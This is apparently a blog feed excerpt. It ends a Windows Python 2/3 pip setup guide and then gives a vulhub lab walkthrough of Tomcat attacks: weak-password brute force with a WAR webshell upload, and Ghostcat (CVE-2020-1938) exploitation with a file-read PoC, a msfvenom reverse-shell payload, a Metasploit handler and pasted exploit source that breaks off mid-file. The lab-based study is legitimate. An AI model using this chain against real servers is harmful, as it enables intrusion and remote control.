uninstall pip</span><br></pre></td></tr></table></figure><p>再重新安装pip</p><h3 id="安装-pip2">安装 pip2</h3><h4 id="使用-Python-自带的-ensurepip-模块">使用 Python 自带的 ensurepip 模块</h4><p>Python 2.7 及以上版本中，Python 自带了一个名为 <code>ensurepip</code> 的模块，可以用来安装 pip。在命令行中运行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m ensurepip --upgrade</span><br></pre></td></tr></table></figure><p>此命令将自动下载并安装 pip，并升级到最新版本。</p><h4 id="使用-get-pip-py-脚本">使用 <a href="http://get-pip.py">get-pip.py</a> 脚本</h4><p>如果上述方法不可行，可以尝试使用 <code>get-pip.py</code> 脚本手动安装 pip。首先，确保你已经下载了 Python 2.7 的安装包，其中包含了 <code>get-pip.py</code> 文件。下载地址为：<a href="https://bootstrap.pypa.io/2.7/get-pip.py">https://bootstrap.pypa.io/2.7/get-pip.py</a></p><p>然后，在命令行中运行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 get-pip.py</span><br></pre></td></tr></table></figure><p>此命令将执行 <code>get-pip.py</code> 脚本，自动下载并安装 pip。</p><h3 id="验证-pip2-安装">验证 pip2 安装</h3><p>安装完 pip2 后，可以通过以下命令验证 pip2 是否安装成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip2 --version</span><br></pre></td></tr></table></figure><p>如果输出显示了 pip2 的版本信息，则说明 pip2 已经成功安装。</p><p>然后问题就解决了。</p><h2 id="python2和3共存后必须指定版本而无法使用“python”命令问题解决">python2和3共存后必须指定版本而无法使用“python”命令问题解决</h2><p>这是因为之前修改了python.exe为python2.exe和python3.exe，所以无法直接使用python。</p><p>解决方法就是：</p><ol><li>想让”python“默认指向python3，就在python3文件中的python.exe复制一份，然后再修改成python3.exe（就是文件中同时存在python.exe和python3.exe）</li><li>想让”python“默认指向python2，就在python2文件中的python.exe复制一份，然后再修改成python2.exe（就是文件中同时存在python.exe和python2.exe）</li></ol><p>之后就会默认指向某个版本了。</p>]]></content>
    
    
    <summary type="html">🥧win系统配置python2和python3共存以及配置pip；win10系统下python2和python3共存设置；win10系统下python2和python3共存以及pip配置问题；python2无法更新/安装pip问题解决；python2和3共存后必须指定版本而无法使用“python”命令问题解决</summary>
    
    
    
    <category term="其他学习笔记" scheme="https://blog.m3x1.cn/categories/%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="其他学习笔记" scheme="https://blog.m3x1.cn/tags/%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【vulhub漏洞靶场】tomcat漏洞及漏洞复现</title>
    <link href="https://blog.m3x1.cn/posts/a96128fe.html"/>
    <id>https://blog.m3x1.cn/posts/a96128fe.html</id>
    <published>2025-03-27T16:00:00.000Z</published>
    <updated>2025-03-28T07:09:19.034Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="tomcat8">tomcat8</h2><blockquote><p>kali靶机：192.168.192.132</p><p>win10攻击机：192.168.192.129</p></blockquote><h3 id="环境说明">环境说明</h3><p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。</p><p>Tomcat7+权限分为：</p><ul><li>manager（后台管理）<ul><li>manager-gui 拥有html页面权限</li><li>manager-status 拥有查看status的权限</li><li>manager-script 拥有text接口的权限，和status权限</li><li>manager-jmx 拥有jmx权限，和status权限</li></ul></li><li>host-manager（虚拟主机管理）<ul><li>admin-gui 拥有html页面权限</li><li>admin-script 拥有text接口权限</li></ul></li></ul><h3 id="漏洞复现">漏洞复现</h3><p>靶机进入vulhub-master/tomcat/tomcat8,启动docker</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326165628798.png" alt="image-20250326165628798"></p><p>开启环境之后浏览器打开，如果不知道tomcat的后台管理页面为manager的话，在本环境中也可以自己摸索出登录框，点击图中任意三个请求之后也能发现登录框</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/28ff0661acc62e0ea2101b28b2618fa2.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/415b65ab170d2bced11bac4a83b0dc4c.png" alt="img"></p><p>找到登录页面之后尝试tomcat的弱口令,先抓包发现一个base编码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327103117221.png" alt="image-20250327103117221"></p><p>解码发现：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327103239255.png" alt="image-20250327103239255"></p><p>然后知道了他传递账户密码的方式，就可以进行爆破了</p><p>爆破出来是tomcat:tomcat</p><p>之后就发现可以进行上传文件的操作</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5c38eb17fb273c5faedc1f3a0fab82ee.png" alt="img"></p><p>接下来先用哥斯拉生成一个jsp文件</p><p>然后用java命令，将它打包成war格式：（或者将jsp文件压缩成zip文件，然后修改后缀为war）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf shell.war shell.jsp</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327111550121.png" alt="image-20250327111550121"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327111635208.png" alt="image-20250327111635208"></p><p>上传war包getshell，上传完成之后就可以看到多了一栏数据</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7b396b9105f6d2d1b7ffa12aaa272cb9.png" alt="img"></p><p>然后访问路径为/shell/shell.jsp，如果能访问成功，就说明成功了。</p><p>打开哥斯拉进行连接，成功拿到shell</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327112003498.png" alt="image-20250327112003498"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327112312284.png" alt="image-20250327112312284"></p><h2 id="CVE-2020-1938">CVE-2020-1938</h2><blockquote><p>kali靶机：192.168.192.132</p><p>kali攻击机：192.168.192.133</p></blockquote><p>Tomcat 是当前最流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。Ghostcat是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p><p>tomcat 配置了两个Connecto，它们分别是 HTTP 和 AJP ：HTTP默认端口为8080，处理http请求，而AJP默认端口8009，用于处理 AJP 协议的请求，而AJP比http更加优化，多用于反向、集群等，漏洞由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件以及可以包含任意文件，如果有某上传点，上传图片马等等，即可以获取shell。</p><p>环境启动之后，进行端口扫描</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327202910328.png" alt="image-20250327202910328"></p><p>看到有个陌生的ajp13协议，搜索得知这是个定向包协议。因为性能原因，使用二进制格式来传输可读性文本。</p><blockquote><p><strong>AJP13</strong>是Apache Tomcat中使用的一种高效的二进制协议，它允许Web服务器与Servlet容器之间通过TCP连接进行通信。这种协议的设计目的是为了提高性能，因为它使用二进制格式传输可读性文本，从而减少了处理socket连接的开销。在AJP13协议中，Web服务器和Servlet容器之间尝试保持持久性的TCP连接，以便在多个请求/响应循环中重用同一个连接。这意味着，一旦连接被分配给特定请求，在请求处理结束之前，该连接不会再次分配给其他请求。</p></blockquote><p>访问8080端口，是个tomcat的页面。</p><p>接下来我们利用poc进行漏洞检测。若存在漏洞则可以查看webapps目录下的所有文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</span><br><span class="line">cd CNVD-2020-10487-Tomcat-Ajp-lfi</span><br><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f /WEB-INF/文件名 靶机ip   #py2环境</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327204718269.png" alt="image-20250327204718269"></p><p>看到能成功读取web.xml文件，就是验证了漏洞存在。</p><p>验证完成之后就可以进行漏洞利用的操作了</p><p>先在靶机利用msf生成一个jsp木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.192.133 LPORT=4444 R &gt;shell.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327205509964.png" alt="image-20250327205509964"></p><p>接着把木马上传到docker容器中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp shell.txt ae1efd71d43f:/usr/local/tomcat/webapps/ROOT/WEB-INF/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327205849367.png" alt="image-20250327205849367"></p><p>进入docker容器检查一下，出现shell.txt，说明上传成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -ti 容器id bash</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327205924843.png" alt="image-20250327205924843"></p><p>我们试着在攻击机上利用poc读取shell.txt文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f /WEB-INF/shell.txt 靶机ip   #py2环境</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327211933141.png" alt="image-20250327211933141"> 读取成功，实现了任意文件读取的漏洞验证。接下来进行漏洞利用来getshell。</p><p>上传完成之后，攻击机进入msf进行端口监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload java/jsp_shell_reverse_tcp</span><br><span class="line">set lhost 攻击机ip</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327210622683.png" alt="image-20250327210622683"></p><p>之后再利用exp进行反弹shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python CNVD-2020-10487-Tomcat-Ajp-lfi-rce.py -p 8009 192.168.192.132 --rce 1 -f /WEB-INF/shell.txt</span><br><span class="line">#注意这个exp是修改了的，不是原来的exp，源代码如下。需要使用python3运行，其他都差不多，多了一个--rce参数进行编译运行jsp文件。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># CNVD-2020-10487  Tomcat-Ajp lfi</span><br><span class="line"># by ydhcui</span><br><span class="line">import struct</span><br><span class="line">import io</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Some references:</span><br><span class="line"># https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html</span><br><span class="line">def pack_string(s):</span><br><span class="line">    if s is None:</span><br><span class="line">        return struct.pack(&quot;&gt;h&quot;, -1)</span><br><span class="line">    l = len(s)</span><br><span class="line">    return struct.pack(&quot;&gt;H%dsb&quot; % l, l, s.encode(&#x27;utf8&#x27;), 0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def unpack(stream, fmt):</span><br><span class="line">    size = struct.calcsize(fmt)</span><br><span class="line">    buf = stream.read(size)</span><br><span class="line">    return struct.unpack(fmt, buf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def unpack_string(stream):</span><br><span class="line">    size, = unpack(stream, &quot;&gt;h&quot;)</span><br><span class="line">    if size == -1:  # null string</span><br><span class="line">        return None</span><br><span class="line">    res, = unpack(stream, &quot;%ds&quot; % size)</span><br><span class="line">    stream.read(1)  # \0</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class NotFoundException(Exception):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AjpBodyRequest(object):</span><br><span class="line">    # server == web server, container == servlet</span><br><span class="line">    SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)</span><br><span class="line">    MAX_REQUEST_LENGTH = 8186</span><br><span class="line"></span><br><span class="line">    def __init__(self, data_stream, data_len, data_direction=None):</span><br><span class="line">        self.data_stream = data_stream</span><br><span class="line">        self.data_len = data_len</span><br><span class="line">        self.data_direction = data_direction</span><br><span class="line"></span><br><span class="line">    def serialize(self):</span><br><span class="line">        data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)</span><br><span class="line">        if len(data) == 0:</span><br><span class="line">            return struct.pack(&quot;&gt;bbH&quot;, 0x12, 0x34, 0x00)</span><br><span class="line">        else:</span><br><span class="line">            res = struct.pack(&quot;&gt;H&quot;, len(data))</span><br><span class="line">            res += data</span><br><span class="line">        if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:</span><br><span class="line">            header = struct.pack(&quot;&gt;bbH&quot;, 0x12, 0x34, len(res))</span><br><span class="line">        else:</span><br><span class="line">            header = struct.pack(&quot;&gt;bbH&quot;, 0x41, 0x42, len(res))</span><br><span class="line">        return header + res</span><br><span class="line"></span><br><span class="line">    def send_and_receive(self, socket, stream):</span><br><span class="line">        while True:</span><br><span class="line">            data = self.serialize()</span><br><span class="line">            socket.send(data)</span><br><span class="line">            r = AjpResponse.receive(stream)</span><br><span class="line">            while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS:</span><br><span class="line">                r = AjpResponse.receive(stream)</span><br><span class="line"></span><br><span class="line">            if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AjpForwardRequest(object):</span><br><span class="line">    _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(</span><br><span class="line">        28)</span><br><span class="line">    REQUEST_METHODS = &#123;&#x27;GET&#x27;: GET, &#x27;POST&#x27;: POST, &#x27;HEAD&#x27;: HEAD, &#x27;OPTIONS&#x27;: OPTIONS, &#x27;PUT&#x27;: PUT, &#x27;DELETE&#x27;: DELETE,</span><br><span class="line">                       &#x27;TRACE&#x27;: TRACE&#125;</span><br><span class="line">    # server == web server, container == servlet</span><br><span class="line">    SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)</span><br><span class="line">    COMMON_HEADERS = [&quot;SC_REQ_ACCEPT&quot;,</span><br><span class="line">                      &quot;SC_REQ_ACCEPT_CHARSET&quot;, &quot;SC_REQ_ACCEPT_ENCODING&quot;, &quot;SC_REQ_ACCEPT_LANGUAGE&quot;,</span><br><span class="line">                      &quot;SC_REQ_AUTHORIZATION&quot;,</span><br><span class="line">                      &quot;SC_REQ_CONNECTION&quot;, &quot;SC_REQ_CONTENT_TYPE&quot;, &quot;SC_REQ_CONTENT_LENGTH&quot;, &quot;SC_REQ_COOKIE&quot;,</span><br><span class="line">                      &quot;SC_REQ_COOKIE2&quot;,</span><br><span class="line">                      &quot;SC_REQ_HOST&quot;, &quot;SC_REQ_PRAGMA&quot;, &quot;SC_REQ_REFERER&quot;, &quot;SC_REQ_USER_AGENT&quot;</span><br><span class="line">                      ]</span><br><span class="line">    ATTRIBUTES = [&quot;context&quot;, &quot;servlet_path&quot;, &quot;remote_user&quot;, &quot;auth_type&quot;, &quot;query_string&quot;, &quot;route&quot;, &quot;ssl_cert&quot;,</span><br><span class="line">                  &quot;ssl_cipher&quot;, &quot;ssl_session&quot;, &quot;req_attribute&quot;, &quot;ssl_key_size&quot;, &quot;secret&quot;, &quot;stored_method&quot;]</span><br><span class="line"></span><br><span class="line">    def __init__(self, data_direction=None):</span><br><span class="line">        self.prefix_code = 0x02</span><br><span class="line">        self.method = None</span><br><span class="line">        self.protocol = None</span><br><span class="line">        self.req_uri = None</span><br><span class="line">        self.remote_addr = None</span><br><span class="line">        self.remote_host = None</span><br><span class="line">        self.server_name = None</span><br><span class="line">        self.server_port = None</span><br><span class="line">        self.is_ssl = None</span><br><span class="line">        self.num_headers = None</span><br><span class="line">        self.request_headers = None</span><br><span class="line">        self.attributes = None</span><br><span class="line">        self.data_direction = data_direction</span><br><span class="line"></span><br><span class="line">    def pack_headers(self):</span><br><span class="line">        self.num_headers = len(self.request_headers)</span><br><span class="line">        res = &quot;&quot;</span><br><span class="line">        res = struct.pack(&quot;&gt;h&quot;, self.num_headers)</span><br><span class="line">        for h_name in self.request_headers:</span><br><span class="line">            if h_name.startswith(&quot;SC_REQ&quot;):</span><br><span class="line">                code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1</span><br><span class="line">                res += struct.pack(&quot;BB&quot;, 0xA0, code)</span><br><span class="line">            else:</span><br><span class="line">                res += pack_string(h_name)</span><br><span class="line"></span><br><span class="line">            res += pack_string(self.request_headers[h_name])</span><br><span class="line">        return res</span><br><span class="line"></span><br><span class="line">    def pack_attributes(self):</span><br><span class="line">        res = b&quot;&quot;</span><br><span class="line">        for attr in self.attributes:</span><br><span class="line">            a_name = attr[&#x27;name&#x27;]</span><br><span class="line">            code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1</span><br><span class="line">            res += struct.pack(&quot;b&quot;, code)</span><br><span class="line">            if a_name == &quot;req_attribute&quot;:</span><br><span class="line">                aa_name, a_value = attr[&#x27;value&#x27;]</span><br><span class="line">                res += pack_string(aa_name)</span><br><span class="line">                res += pack_string(a_value)</span><br><span class="line">            else:</span><br><span class="line">                res += pack_string(attr[&#x27;value&#x27;])</span><br><span class="line">        res += struct.pack(&quot;B&quot;, 0xFF)</span><br><span class="line">        return res</span><br><span class="line"></span><br><span class="line">    def serialize(self):</span><br><span class="line">        res = &quot;&quot;</span><br><span class="line">        res = struct.pack(&quot;bb&quot;, self.prefix_code, self.method)</span><br><span class="line">        res += pack_string(self.protocol)</span><br><span class="line">        res += pack_string(self.req_uri)</span><br><span class="line">        res += pack_string(self.remote_addr)</span><br><span class="line">        res += pack_string(self.remote_host)</span><br><span class="line">        res += pack_string(self.server_name)</span><br><span class="line">        res += struct.pack(&quot;&gt;h&quot;, self.server_port)</span><br><span class="line">        res += struct.pack(&quot;?&quot;, self.is_ssl)</span><br><span class="line">        res += self.pack_headers()</span><br><span class="line">        res += self.pack_attributes()</span><br><span class="line">        if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:</span><br><span class="line">            header = struct.pack(&quot;&gt;bbh&quot;, 0x12, 0x34, len(res))</span><br><span class="line">        else:</span><br><span class="line">            header = struct.pack(&quot;&gt;bbh&quot;, 0x41, 0x42, len(res))</span><br><span class="line">        return header + res</span><br><span class="line"></span><br><span class="line">    def parse(self, raw_packet):</span><br><span class="line">        stream = io.StringIO(raw_packet)</span><br><span class="line">        self.magic1, self.magic2, data_len = unpack(stream, &quot;bbH&quot;)</span><br><span class="line">        self.prefix_code, self.method = unpack(stream, &quot;bb&quot;)</span><br><span class="line">        self.protocol = unpack_string(stream)</span><br><span class="line">        self.req_uri = unpack_string(stream)</span><br><span class="line">        self.remote_addr = unpack_string(stream)</span><br><span class="line">        self.remote_host = unpack_string(stream)</span><br><span class="line">        self.server_name = unpack_string(stream)</span><br><span class="line">        self.server_port = unpack(stream, &quot;&gt;h&quot;)</span><br><span class="line">        self.is_ssl = unpack(stream, &quot;?&quot;)</span><br><span class="line">        self.num_headers, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">        self.request_headers = &#123;&#125;</span><br><span class="line">        for i in range(self.num_headers):</span><br><span class="line">            code, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">            if code &gt; 0xA000:</span><br><span class="line">                h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001]</span><br><span class="line">            else:</span><br><span class="line">                h_name = unpack(stream, &quot;%ds&quot; % code)</span><br><span class="line">                stream.read(1)  # \0</span><br><span class="line">            h_value = unpack_string(stream)</span><br><span class="line">            self.request_headers[h_name] = h_value</span><br><span class="line"></span><br><span class="line">    def send_and_receive(self, socket, stream, save_cookies=False):</span><br><span class="line">        res = []</span><br><span class="line">        i = socket.sendall(self.serialize())</span><br><span class="line">        if self.method == AjpForwardRequest.POST:</span><br><span class="line">            return res</span><br><span class="line"></span><br><span class="line">        r = AjpResponse.receive(stream)</span><br><span class="line">        assert r.prefix_code == AjpResponse.SEND_HEADERS</span><br><span class="line">        res.append(r)</span><br><span class="line">        if save_cookies and &#x27;Set-Cookie&#x27; in r.response_headers:</span><br><span class="line">            self.headers[&#x27;SC_REQ_COOKIE&#x27;] = r.response_headers[&#x27;Set-Cookie&#x27;]</span><br><span class="line"></span><br><span class="line">        # read body chunks and end response packets</span><br><span class="line">        while True:</span><br><span class="line">            r = AjpResponse.receive(stream)</span><br><span class="line">            res.append(r)</span><br><span class="line">            if r.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">                break</span><br><span class="line">            elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">                